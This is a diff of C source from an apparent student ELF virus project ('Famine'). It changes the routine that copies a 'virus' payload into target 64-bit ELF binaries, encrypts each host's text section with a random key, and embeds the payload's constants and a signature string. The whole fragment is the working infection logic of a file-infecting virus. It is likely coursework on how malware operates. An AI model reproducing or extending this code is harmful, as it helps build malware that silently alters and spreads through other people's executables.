@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 02:21:37 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 07:29:10 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,6 +18,7 @@
 #include "utils.h"
 #include "infect.h"
 #include "errors.h"
+#include "famine.h"
 
 /*
 **  Elf64_packer memory overview
@@ -58,22 +59,12 @@
 # define SECRET_SIGNATURE	(char[10]){'4','2','R','e','m','b','l','a','i','\0'}
 # define SECRET_LEN		10
 
-struct payload_constants
-{
-	uint32_t	key[4];
-	uint64_t	relative_pt_load_address;
-	uint64_t	pt_load_size;
-	uint64_t	relative_text_address;
-	uint64_t	relative_entry_address;
-	uint64_t	text_size;
-}__attribute__((packed));
-
 static void	generate_key(char *buffer, size_t len)
 {
 	ft_getrandom(buffer, len);
 }
 
-static void	init_constants(struct payload_constants *constants, \
+static void	init_constants(struct client_info *constants, \
 			const struct entry *original_entry, \
 			const struct endians_pointer endians)
 {
@@ -97,11 +88,11 @@ bool		setup_payload(const struct entry *original_entry, \
 			const struct endians_pointer endians, \
 			const struct safe_pointer info)
 {
-	struct payload_constants	constants;
+	struct client_info	constants;
 
 	init_constants(&constants, original_entry, endians);
 
-	const size_t	payload_size = end_payload - begin_payload;
+	const size_t	payload_size = _start - virus;
 	const size_t	text_size    = endians.endian_8(original_entry->safe_shdr->sh_size);
 	const size_t	payload_off  = original_entry->end_of_last_section;
 	const size_t	text_off     = payload_off - constants.relative_text_address;
@@ -111,10 +102,10 @@ bool		setup_payload(const struct entry *original_entry, \
 	void	*text_location       = safe(text_off, text_size);
 
 	if (!payload_location || !constants_location || !text_location)
-       return errors(ERR_CORRUPT, "wildly unreasonable");
+		return errors(ERR_CORRUPT, "wildly unreasonable");
 
 	encrypt(32, text_location, constants.key, text_size);
-	ft_memcpy(payload_location, begin_payload, payload_size);
+	ft_memcpy(payload_location, virus, payload_size);
 	ft_memcpy(constants_location, &constants, sizeof(constants));
 
 	return true;
